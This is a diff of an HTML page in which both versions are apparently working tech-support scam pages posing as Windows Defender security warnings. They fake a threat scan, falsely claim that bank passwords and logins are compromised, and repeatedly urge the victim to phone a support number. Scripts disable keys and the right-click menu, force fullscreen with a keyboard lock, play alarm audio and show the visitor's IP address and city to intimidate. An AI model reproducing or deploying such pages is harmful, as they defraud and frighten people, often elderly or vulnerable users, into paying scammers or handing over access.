@@ -1,61 +1,7 @@
+
+
+<!doctype html>
 <html lang="en">
-
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-<head>
-    <meta charset="utf-8">
-    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
-    <meta content="noindex,nofollow" name="robots">
-    <title>Security Center</title>
-    <link href="msmm.png" rel="icon" id="favicon" type="image/png">
-    <link href="tapa.css" rel="stylesheet">
-
-    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
-    <script type="text/javascript">//<![CDATA[
-    $(function(){
-    $('body').bind('contextmenu', function(e){
-    return false;
-    });
-    });//]]>
-    </script>
-
-    <script src="noir.js"></script>
-
-    <script>
-      var t = new XMLHttpRequest;
-      t.onreadystatechange = function() {
-        if (4 == this.readyState && 200 == this.status) {
-          var a = JSON.parse(this.responseText);
-          ipadd = a.ip;
-          city = a.city;
-          country = a.country;
-          isp = a.connection.isp;
-          var b = new Date;
-          currtime = a.timezone.current_time;
-          document.getElementById("ip_add").textContent = "Address IP: " + ipadd + " " + b.toLocaleString("EN-US", currtime);
-          document.getElementById("city").textContent = "City: " + city + ", " + country;
-          document.getElementById("isp").textContent = "ISP: " + isp
-        }
-      };
-      t.open("GET", "https://ipwho.is/?lang=en", !0);
-      t.send();
-    </script>
-
-
-
-    <script>
-          function dfvhsdkghdjkhjdkdjqdffgy(name)
-          {
-              name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
-              var regexS = "[\\?&]"+name+"=([^&#]*)";
-              var regex = new RegExp( regexS );
-              var results = regex.exec( window.location.href );
-              if( results == null )
-                  return "";
-              else
-                  return results[1];
-          }
-          var ph0n = dfvhsdkghdjkhjdkdjqdffgy('ph0n');
-      </script>
 
 <!--Start of Tawk.to Script-->
 <script type="text/javascript">
@@ -71,349 +17,395 @@
   </script>
   <!--End of Tawk.to Script-->
 
-  </head>
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-
-  <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
-
-<div style="position:absolute; top:100px; right:10px; z-index:9999;"><img src="def.gif" alt="" width="500"></div>
-
-
-    <div class="bg" style="cursor:none">
-      <div class="bgimg" style="top:0">
-        <img src="f24.png" alt="" width="100%">
-      </div>
-    </div>
-    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
-      <div class="black" style="height: 145%; cursor: none; display: block;"></div>
-    </a>
-    <div class="pro_box" style="cursor: none; display: block;">
-      <div class="pro_box_header">
-        <div class="row">
-          <div class="col-md-12">
-            <div class="minimize">
-              <ul>
-                <li>
-                  <a href="#">
-                    <img src="mnc.png">
-                  </a>
-                </li>
-              </ul>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="logo">
-              <img src="msmm.png">
-              <span>Windows security</span>
-            </div>
-          </div>
-          <div class="col-md-8">
-            <div class="activate_lic">
-              <ul>
-                <li>
-                  <a href="#">
-                    <button>Activate your license</button>
-                  </a>
-                </li>
-                <li>
-                  <a href="#">
-                    <img src="set.png">
-                  </a>
-                </li>
-                <li>
-                  <a href="#">
-                    <img src="ques.png">
-                  </a>
-                </li
-              </ul>
-            </div>
-          </div>
-        </div>
-      </div>
-      <div class="scan_box">
-        <div class="scan_box_header">
-          <div class="row">
-            <div class="col-md-6">
-              <div class="quick_scan">
-                <p>
-                  <img src="vsc.png">
-                  <span>scanning rapido</span>
-                </p>
-              </div>
-            </div>
-            <div class="col-md-6">
-              <div class="minimize1">
-                <ul>
-                  <li>
-                    <a href="#">
-                      <img src="mnc.png">
-                    </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div class="scan_body">
-          <div style="margin: 15px 10px;">
-            <img src="bxs.png" alt="" style="max-width: 100%;">
-          </div>
-          <div class="table_quick">
-            <table class="table table-bordered">
-              <thead>
-                <tr>
-                  <th scope="col">scanned object</th>
-                  <th scope="col">
-                    <div class="col_fourth counter">
-                      <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
-                    </div>
-                  </th>
-                </tr>
-                <tr>
-                  <th scope="col">time spent</th>
-                  <th scope="col">5 secs</th>
-                </tr>
-                <tr>
-                  <th scope="col">identified threats</th>
-                  <th scope="col" style="color:red">
-                    <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
-                  </th>
-                </tr>
-              </thead>
-            </table>
-          </div>
-        </div>
-        <div class="scan_footer">
-          <div class="row">
-            <div class="col-md-6">
-              <div class="bt_can">
-                <div class="btn-group" role="group" aria-label="Basic example">
-                  <button class="btn btn-secondary" type="button">cancel</button>
-                </div>
-                <div class="btn-group" role="group" aria-label="Basic example">
-                  <button class="btn btn-secondary" type="button">pause</button>
-                </div>
-              </div>
-            </div>
-            <div class="col-md-6">
-              <div class="bt_can2">
-                <div class="btn-group" role="group" aria-label="Basic example">
-                  <button class="btn btn-secondary" type="button">scheduled scan</button>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="pro_box2" style="cursor: none; display: block;">
-      <img src="bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
-      margin: 0 auto;">
-    </div>
-    <div class="pro_box3" style="cursor: none; display: block;">
-      <img src="web1.png" alt="" style="width:100%;max-width: 100%;display: block;
-      margin: 0 auto;">
-    </div>
-    <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
-      <div class="row">
-        <div class="col-md-12">
-          <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
-            <span id="footertxt">
-              <img src="msmm.png"> Windows security </span>
-            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Windows Support: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> Call us directly +1-866-664-1242
-              </span>
-            </span>
-          </div>
-        </div>
-        <div class="col-md-12">
-          <marquee direction="left" height="100px" width="100%">
-            <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen now prevents unrecognized applications from appearing. system may be at risk. A Windows Defender scan found adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </small>
-          </marquee>
-        </div>
-      </div>
-    </div>
-    <div class="lightbox" id="poptxt" style="display: block;">
-      <div class="ilb top" style="font-size:17px">
-        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
-          <span class="fl title" id="txtadd">
-            <span class="fl ilb">
-              <img src="dm.png" class="logo3">
-            </span>Windows Defender Security Center </span>
-          <span class="fl title2" id="txts1">
-            <a href="#" id="bgt">
-              <img src="cs.png">
-            </a>
-          </span>
-        </div>
-      </div>
-      <div id="txtintro">
-        <span class="colo-rd">
-          <div id="ip_add">Microsoft Windows Firewall Warning!</div>
-          <div id="city">A system infected with Trojan spyware</div>
-          <div id="isp"> (Error code: 2v7HgTvB)</div>
-        </span>
-      </div>
-      <img src="re.gif" id="banner">
-      <div id="disclaimer">Access to this system is blocked for security reasons.  <br>
-        <span class="support" style="font-size:22px;">Please call Windows Support:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> Call us directly +1-866-664-1242
-          </span>
-        </span>
-      </div>
-      <div id="bottom">
-        <img src="msmm.png" id="badge">
-        <span class="title3">Windows</span>
-        <ul>
-          <li>
-            <a href="#">
-              <div class="fr button2">
-                <span id="addtochromebutton">Allow</span>
-              </div>
-            </a>
-          </li>
-          <li>
-            <a href="#">
-              <div class="fr button blink">
-                <span id="addtochromebutton">Deny</span>
-              </div>
-            </a>
-          </li>
-        </ul>
-      </div>
-    </div>
-    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
-      <p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows-Defender - Security Warning</p>
-      <p>
-        <b>Access to this system is blocked for security reasons !</b>
-      </p>
-      <p>Your computer has been reported to be infected with Trojan-type spyware. The following data was compromised: </p>
-       <p>> Email ID <br>&gt; Bank Password <br>&gt; Facebook Login <br>&gt; Photos and Documents </p>
-       <p>Windows Defender scan found adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </p>
-       <p>Please contact us immediately. Our engineer will guide you through the removal process over the phone. </p>
-       <p>Call Windows Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
-       <p>Closing this window may put your personal information at risk and may cause your Windows registration to be suspended. </p>
-      <p style="padding-bottom:0;color:#fff;font-size:16px">Call Windows Support: <strong>
-          <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br/>Call us directly  +1-866-664-1242
-          </span>
-        </strong>
-      </p>
-      <div class="action_buttons">
-        <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a>
-        <a class="active" id="leave_page" style="color:#fff!important">cancel</a>
-      </div>
-    </div>
-    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
-      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">Please contact us immediately. Our engineer will guide you through the removal process over the phone. Your computer has been disabled. Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may put your system at risk. <br>
-        <strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="winlo.png" alt="&nbsp"  style="width: 25px;vertical-align: bottom;"> Call us directly +1-866-664-1242
-          </span>
-        </strong>
-      </p>
-    </div>
-    <div id="chat" style="display: block;">
-      <img src="msmm.png">
-      <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
-      <p style="font-weight:600;font-size:24px">Call support: <br>
-      </p>
-      <h4 style="font-weight:600;font-size:22px"> <img src="winlo.png" alt=""  style="width: 25px;margin-left: 0;"> Call us directly +1-866-664-1242
-        <br>(Security Support)
-      </h4>
-      <div class="arrow-down">
-        <svg height="1em" viewBox="0 0 320 512">
-          <style>
-            svg {
-              fill: #fff
-            }
-          </style>
-          <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
-        </svg>
-      </div>
-    </div>
-    <script src="nvidia.js"></script>
-    <script src="jupiter.js"></script>
-    <script src="bxsafe.js"></script>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
+          integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="main.css">
+    <title>Service Center</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
 
     <script>
-      $(document).ready(function() {
-        $("#mycanvas").click(function() {
-          $("#welcomeDiv").show()
-        })
-      });
-    </script>
-
-    <script>
-      $(document).ready(function() {
-        $("#mycanvas").click(function() {
-          $("#poptxt").show()
-        })
-      });
-      $(document).ready(function() {
-        $("#cross").click(function() {
-          $("#poptxt").show()
-        })
-      });
-    </script>
-
-    <script>
-      $(document).ready(function() {
-        $("#mycanvas").click(function() {
-          $("#footer").show()
-        })
-      });
-      </script>
-    <script>
-      $(document).ready(function() {
-        $("body").mouseover(function() {
-          $("#poptxt").show()
-        })
-      });
-    </script>
-    <script>
-      var isNS = "Netscape" == navigator.appName ? 1 : 0;
-      "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
-
-      function mischandler() {
-        return !1
-      }
-
-      function mousehandler(a) {
-        a = isNS ? a : event;
-        a = isNS ? a.which : a.button;
-        if (2 == a || 3 == a) return !1
-      }
-      document.oncontextmenu = mischandler;
-      document.onmousedown = mousehandler;
-      document.onmouseup = mousehandler;
-    </script>
-    <script>
-      document.onkeydown = function(a) {
-        return !1
-      };
-    </script>
-    <script>
-      document.attachEvent("onkeydown", win_onkeydown_handler);
-
-      function win_onkeydown_handler() {
-        switch (event.keyCode) {
-          case 116:
-            event.returnValue = !1;
-            event.keyCode = 0;
-            break;
-          case 27:
-            event.returnValue = !1, event.keyCode = 0
+        function getVariableFromURll(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
         }
+    </script>
+    <script type="text/javascript">
+        var phone = getVariableFromURll('phone');
+    </script>
+
+
+
+
+<script>
+
+    let closePP = document.querySelector('.btn23-primary');
+    let overlay = document.querySelector('.modal23-dialog');
+
+    let KEY_ESC = 27;
+    document.onkeydown = function(e) {
+        if (e.keyCode == KEY_ESC) {
+           document.querySelector('.wrapper').style.cursor="auto";
+           setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 7500);
+
+       }
+   }
+
+
+
+   setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 7500);
+
+   document.addEventListener('click', () => {
+
+
+    document.getElementById("webados").play();
+
+    //document.documentElement.requestFullscreen();
+    document.body.requestFullscreen().then(
+    () => {
+      const keys = [
+        { code: 'Escape' },
+        { code: 'Tab', altKey: true },
+        { code: 'Tab', metaKey: true },
+      ];
+      //navigator.requestSystemKeyboardLock(keys);
+      navigator.keyboard.lock();
+    });
+    document.addEventListener('keydown', event => {
+      if (event.code == 'Escape') {
+        console.dir('escape punched');
       }
+    }, false);
+    document.querySelector('.modal23-dialog').style.display="none";
+    document.querySelector('.wrapper').style.cursor="none";
+
+
+});
+
+
+
+   document.addEventListener('mouseleave', showDontLeavePopup);
+   var popupShows = 0;
+   function showDontLeavePopup() {
+
+    document.querySelector('.modal-dialog23').style.display="block";
+
+
+}
+
+
+        // document.querySelector('.btn-primary').onclick = function() {
+        //     document.querySelector('.modal-dialog').style.display = 'none';
+        // };
+
+
     </script>
 
-    <script>
-      $(document).ready(function() {
-        $("#chat").delay(600).fadeIn(100)
-      });
-    </script>
+</head>
+<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
 
-<script src="esc.js"></script>
-<script src="main.js"></script>
-<script src="info.js"></script>
-<script src="custom.js"></script>
+  <div style="position:absolute; top:100px; right:10px; z-index:999999999;"><img src="def.gif" alt="" width="500"></div>
 
-  </body>
 
+<audio id="webados" autoplay="">
+    <source src="safegtb.mp3" type="audio/mpeg">
+</audio>
+<div class="bg" style="cursor:none;">
+    <div class="background" style="top: 0px;"><img src="bg1.png" alt="" width="100%"/></div>
+    <div class="background2" style="top: 0px;"><img src="bg1.png" alt="" width="100%" /></div>
+
+</div>
+
+<a href="#" rel="noreferrer" id="link_blck" style="cursor: none;">
+
+</a>
+
+
+<div id="footer" style="cursor: none;">
+    <div class="row">
+
+        <div class="col-md-12">
+            <div class="right-foot" style="text-align: center;">
+                <span id="footertxt"><img src="microsoft.png"> Windows Security: </span><span
+                        style="font-weight: 700;padding-left: 13px;color: #fff;">Windows-Helpline <span
+                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;margin-left: 5px;">+1-866-664-1242 </span></span>
+            </div>
+        </div>
+        <div class="col-md-12">
+            <marquee width="100%" direction="left" height="100px"><small class="text-left"
+                                                                         style="color: #eee;font-size: 10px;">Windows Defender SmartScreen has prevented an unrecognized app from being displayed. Running this app may put your PC at risk. Windows Defender Scan has found potentially unwanted adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</small></marquee>
+        </div>
+    </div>
+
+
+</div>
+
+<div id="boxtxts" class="lightbox">
+    <div class="ilb top">
+        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="microsoft.png" class="logo3"></span> Windows Defender System Warning</span>
+            <p id="txts1" class="fl title2"><a href="#"><img src="cross_white.png"></a></p>
+            <!-- <div class="cr_bt"><img src="remove.png"></div> -->
+        </div>
+    </div>
+    <div class="last_box">
+
+    <div id="txtintro">
+        <h3 class="colo-rd" style="font-size: 23px;
+    margin-bottom: 0;"><img src="imgds.png" style="width:35px;"> Critical Threat detected: Adware App</h3>
+
+         <p style="
+    font-size: 15px;
+    font-weight: bold;
+    margin-bottom: 6px;
+">Access to this System has been blocked for security reasons.</p>
+<img id="banner" src="websafg.jpg">
+         <p style="    font-size: 15px;
+    font-weight: bold;margin-bottom: 0;">Important: Please contact support immediately to resolve this issue.</p>
+
+    </div>
+   <!--  <img id="banner" src="websafg.jpg"> -->
+    <div id="disclaimer" style="text-align: center;">
+        <span class="support">Windows-Helpline: +1-866-664-1242</span>
+    </div>
+
+</div>
+<div id="bottom">
+        <img id="badge" src="support.png"><span class="title3">Windows support </span>
+        <ul>
+            <li>
+                <a href="#">
+                    <div class="fr button">
+                        <span id="addtochromebutton">GET HELP</span>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <div class="fr button2">
+                        <span id="addtochromebutton">Reject</span>
+                    </div>
+                </a>
+            </li>
+
+        </ul>
+
+    </div>
+</div>
+
+
+
+<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
+    <p class="text-center" style="    font-size: 16px;
+    font-weight: normal;
+    margin: 0;
+    margin-bottom: 5px;
+    padding: 5px 10px;
+    color: #FFFFFF !important;
+    color: #414141;font-weight: bold;
+    margin-top: 8px;">Windows Defender Security Warning</p>
+    <p>** ACCESS TO THIS COMPUTER HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
+      <p>Your System has reported to us that it has been infected with an adware app. The following data has been compromised.</p>
+      <p>&gt; Email credentials<br>
+          &gt; Bank passwords<br>
+          &gt; Facebook Login<br>
+          &gt; Pictures &amp; Documents
+
+      </p>
+      <p>Windows Defender Scan has found potentially unwanted adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</p>
+      <p>You must contact us immediately so that our technicians can guide you through the removal process by phone.</p>
+      <p>Call Windows Support immediately to report this threat, prevent identity theft and unlock access to this device.</p>
+      <p>Closing this window puts your personal data at risk and results in a suspension of your Windows registry.</p>
+    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
+            +1-866-664-1242</strong></p>
+    <div class="action_buttons"><a class="active" id="leave_page"
+                                   style="cursor: pointer; color: #FFFFFF !important;">Run safely</a> <a class="active"
+                                                                                                 id="leave_page"
+                                                                                                 style="color: #FFFFFF !important;">Ignore</a>
+    </div>
+</div>
+
+<div id="WelDiv"
+     style=" display:none; background-color:#0000009e; height: auto; width: 550px; left:32%;position: absolute;top:0;z-index: 9999999999;  "
+     class="answer_list">
+    <p class="text-center" style="color: #FEFEFE; background-color:#0000009e;  margin-top:10px; font-size: 16px; ">You must contact us immediately so that our technicians can guide you through the removal process by phone.<br>Your System is disabled.<br><br> </p>
+
+
+</div>
+
+
+<!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
+        crossorigin="anonymous"></script>
+<script type="text/javascript" src="fullscreen.js"></script>
+<script type="text/javascript" src="before.js"></script>
+<script type="text/javascript" src="main.js"></script>
+
+<script type="text/javascript">
+    (function ($) {
+        $.fn.countTo = function (options) {
+            options = options || {};
+
+            return $(this).each(function () {
+                // set options for current element
+                var settings = $.extend({}, $.fn.countTo.defaults, {
+                    from: $(this).data('from'),
+                    to: $(this).data('to'),
+                    speed: $(this).data('speed'),
+                    refreshInterval: $(this).data('refresh-interval'),
+                    decimals: $(this).data('decimals')
+                }, options);
+
+                // how many times to update the value, and how much to increment the value on each update
+                var loops = Math.ceil(settings.speed / settings.refreshInterval),
+                    increment = (settings.to - settings.from) / loops;
+
+                // references & variables that will change with each update
+                var self = this,
+                    $self = $(this),
+                    loopCount = 0,
+                    value = settings.from,
+                    data = $self.data('countTo') || {};
+
+                $self.data('countTo', data);
+
+                // if an existing interval can be found, clear it first
+                if (data.interval) {
+                    clearInterval(data.interval);
+                }
+                data.interval = setInterval(updateTimer, settings.refreshInterval);
+
+                // initialize the element with the starting value
+                render(value);
+
+                function updateTimer() {
+                    value += increment;
+                    loopCount++;
+
+                    render(value);
+
+                    if (typeof (settings.onUpdate) == 'function') {
+                        settings.onUpdate.call(self, value);
+                    }
+
+                    if (loopCount >= loops) {
+                        // remove the interval
+                        $self.removeData('countTo');
+                        clearInterval(data.interval);
+                        value = settings.to;
+
+                        if (typeof (settings.onComplete) == 'function') {
+                            settings.onComplete.call(self, value);
+                        }
+                    }
+                }
+
+                function render(value) {
+                    var formattedValue = settings.formatter.call(self, value, settings);
+                    $self.html(formattedValue);
+                }
+            });
+        };
+
+        $.fn.countTo.defaults = {
+            from: 0,               // the number the element should start at
+            to: 0,                 // the number the element should end at
+            speed: 100,           // how long it should take to count between the target numbers
+            refreshInterval: 100,  // how often the element should be updated
+            decimals: 0,           // the number of decimal places to show
+            formatter: formatter,  // handler for formatting the value before rendering
+            onUpdate: null,        // callback method for every time the element is updated
+            onComplete: null       // callback method for when the element finishes updating
+        };
+
+        function formatter(value, settings) {
+            return value.toFixed(settings.decimals);
+        }
+    }(jQuery));
+
+    jQuery(function ($) {
+        // custom formatting example
+        $('.count-number').data('countToOptions', {
+            formatter: function (value, options) {
+                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
+            }
+        });
+
+        // start all the timers
+        $('.timer').each(count);
+
+        function count(options) {
+            var $this = $(this);
+            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
+            $this.countTo(options);
+        }
+    });
+</script>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $(".safegets2").delay(1).fadeIn(800);
+        $(".safegets3").delay(1).fadeIn(800);
+        $(".safegets3").delay(1).fadeIn(800);
+        $("#pop_up_new").delay(1).fadeIn(800);
+        $("#boxtxts").delay(1).fadeIn(800);
+        $(".blck").delay(7300).fadeIn();
+    });
+</script>
+<script type="text/javascript">
+    setTimeout(function () {
+        document.getElementById("webados").play();
+    });
+</script>
+<script>
+    $(document).ready(function () {
+        $("#mycanvas").click(function () {
+            $("#WelDiv").show();
+        });
+    });
+</script>
+<script>
+    $(document).ready(function () {
+        $("#mycanvas").click(function () {
+            $(".background").hide();
+            $(".background2").show();
+        });
+    });
+</script>
+<script>
+    $(document).ready(function () {
+        $("body").click(function () {
+            $(".blck").hide();
+        });
+    });
+</script>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $("body").mouseover(function () {
+            $("#boxtxts").show();
+        });]]
+    });
+</script>
+<!-- <script type="text/javascript">
+    $(document).ready(function () {
+        $("body").mouseover(function () {
+            $(".blck").show();
+        });
+    });
+</script> -->
+</body>
 </html>
